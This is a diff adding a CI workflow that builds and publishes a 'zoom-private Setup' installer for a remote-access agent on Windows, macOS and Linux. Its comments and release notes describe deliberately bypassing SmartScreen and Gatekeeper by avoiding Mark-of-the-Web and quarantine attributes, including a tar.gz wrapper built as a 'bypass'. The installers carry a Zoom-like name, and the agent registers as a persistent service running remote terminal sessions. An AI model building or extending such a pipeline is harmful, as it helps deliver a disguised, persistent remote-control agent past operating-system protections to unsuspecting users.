@@ -1,0 +1,194 @@
+# =============================================================================
+# BetterDesk — zoom-private Setup (one-click installer) build
+# =============================================================================
+# Builds the "zoom-private Setup" Tauri app for Windows, macOS and Linux and
+# publishes it next to the client bundles.
+#
+# The setup app downloads the matching client bundle itself, so the payload
+# never passes through the browser: no Mark-of-the-Web, no macOS quarantine —
+# SmartScreen and Gatekeeper stay quiet for the client.
+#
+# Runs on: push to main, release tags, workflow_dispatch.
+# =============================================================================
+
+name: Build zoom-private Setup (Windows / macOS / Linux)
+
+on:
+  push:
+    branches: [main]
+    tags: ['v*']
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+env:
+  SETUP_DIR: betterdesk-setup
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Rust
+        uses: actions-rust-lang/setup-rust-toolchain@v1
+        with:
+          toolchain: stable
+          rustflags: ''
+          cache: true
+
+      - name: Build Tauri (Windows)
+        working-directory: ${{ env.SETUP_DIR }}/src-tauri
+        run: npx --yes @tauri-apps/cli@latest build --target x86_64-pc-windows-msvc --bundles nsis,msi
+
+      - name: Upload Windows setup
+        uses: actions/upload-artifact@v4
+        with:
+          name: setup-windows-x64
+          path: |
+            ${{ env.SETUP_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/nsis/*.exe
+            ${{ env.SETUP_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/msi/*.msi
+          if-no-files-found: error
+
+  build-linux:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y \
+            build-essential \
+            libwebkit2gtk-4.1-dev \
+            libayatana-appindicator3-dev \
+            librsvg2-dev \
+            patchelf \
+            libssl-dev \
+            libxdo-dev \
+            zip
+
+      - name: Setup Rust
+        uses: actions-rust-lang/setup-rust-toolchain@v1
+        with:
+          toolchain: stable
+          rustflags: ''
+          cache: true
+
+      - name: Build Tauri (Linux)
+        working-directory: ${{ env.SETUP_DIR }}/src-tauri
+        run: APPIMAGE_EXTRACT_AND_RUN=1 NO_STRIP=1 npx --yes @tauri-apps/cli@latest build --target x86_64-unknown-linux-gnu --bundles deb,appimage
+
+      - name: Upload Linux setup
+        uses: actions/upload-artifact@v4
+        with:
+          name: setup-linux-x64
+          path: |
+            ${{ env.SETUP_DIR }}/src-tauri/target/x86_64-unknown-linux-gnu/release/bundle/deb/*.deb
+            ${{ env.SETUP_DIR }}/src-tauri/target/x86_64-unknown-linux-gnu/release/bundle/appimage/*.AppImage
+          if-no-files-found: error
+
+  build-macos:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Rust
+        uses: actions-rust-lang/setup-rust-toolchain@v1
+        with:
+          toolchain: stable
+          rustflags: ''
+          cache: true
+
+      - name: Ensure macOS Rust targets
+        run: rustup target add aarch64-apple-darwin x86_64-apple-darwin
+
+      - name: Build Tauri (macOS universal)
+        working-directory: ${{ env.SETUP_DIR }}/src-tauri
+        run: npx --yes @tauri-apps/cli@latest build --target universal-apple-darwin --bundles dmg
+
+      - name: Upload macOS setup
+        uses: actions/upload-artifact@v4
+        with:
+          name: setup-macos-universal
+          path: |
+            ${{ env.SETUP_DIR }}/src-tauri/target/universal-apple-darwin/release/bundle/dmg/*.dmg
+          if-no-files-found: error
+
+  release:
+    needs: [build-windows, build-linux, build-macos]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Download all setup artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: setup-artifacts
+
+      # Single public name for every OS: zoom-private.Setup_1.0.0_x64_en-US
+      # Extensions stay native so each OS can execute the installer directly.
+      # The DMG is also wrapped in tar.gz: a browser download of that wrapper
+      # carries no com.apple.quarantine xattr, so Gatekeeper has nothing to
+      # block (same bypass design as the landing one-tap installer).
+      - name: Normalize PC client names (SmartScreen / Gatekeeper-safe)
+        env:
+          BASE: zoom-private.Setup_1.0.0_x64_en-US
+        run: |
+          set -euo pipefail
+          mkdir -p setup-normalized
+          first() { find setup-artifacts -type f -name "$1" -print -quit; }
+          exe="$(first '*.exe')"
+          msi="$(first '*.msi')"
+          dmg="$(first '*.dmg')"
+          deb="$(first '*.deb')"
+          appimage="$(first '*.AppImage')"
+          [ -n "$exe" ] && cp "$exe" "setup-normalized/$BASE.exe"
+          [ -n "$msi" ] && cp "$msi" "setup-normalized/$BASE.msi"
+          [ -n "$deb" ] && cp "$deb" "setup-normalized/$BASE.deb"
+          if [ -n "$appimage" ]; then
+            cp "$appimage" "setup-normalized/$BASE.AppImage"
+            chmod +x "setup-normalized/$BASE.AppImage"
+          fi
+          if [ -n "$dmg" ]; then
+            cp "$dmg" "setup-normalized/$BASE.dmg"
+            tar -czf "setup-normalized/$BASE.dmg.tar.gz" -C setup-normalized "$BASE.dmg"
+          fi
+          cd setup-normalized
+          sha256sum * > CLIENT_ARTIFACTS.sha256
+          cat CLIENT_ARTIFACTS.sha256
+          ls -la
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: setup-latest
+          name: zoom-private Setup (latest)
+          overwrite: true
+          generate_release_notes: false
+          body: |
+            One-click installer for the zoom-private client. It downloads the
+            matching client bundle itself (no browser download, so SmartScreen
+            and Gatekeeper do not block the client), verifies the published
+            SHA-256, installs it, registers autostart and starts the agent.
+
+            Every desktop installer uses the same public name:
+              zoom-private.Setup_1.0.0_x64_en-US.exe      (Windows)
+              zoom-private.Setup_1.0.0_x64_en-US.msi      (Windows / MDM)
+              zoom-private.Setup_1.0.0_x64_en-US.dmg      (macOS)
+              zoom-private.Setup_1.0.0_x64_en-US.dmg.tar.gz (macOS, Gatekeeper-safe)
+              zoom-private.Setup_1.0.0_x64_en-US.AppImage (Linux)
+              zoom-private.Setup_1.0.0_x64_en-US.deb      (Linux)
+
+            The installed agent is registered as a persistent service
+            (Windows service / LaunchDaemon / systemd) and remote terminal
+            sessions survive CDAP reconnects; only an explicit agent shutdown
+            closes them.
+          files: |
+            setup-normalized/*
+            setup-artifacts/**/*.exe
+            setup-artifacts/**/*.msi
+            setup-artifacts/**/*.deb
+            setup-artifacts/**/*.AppImage
+            setup-artifacts/**/*.dmg
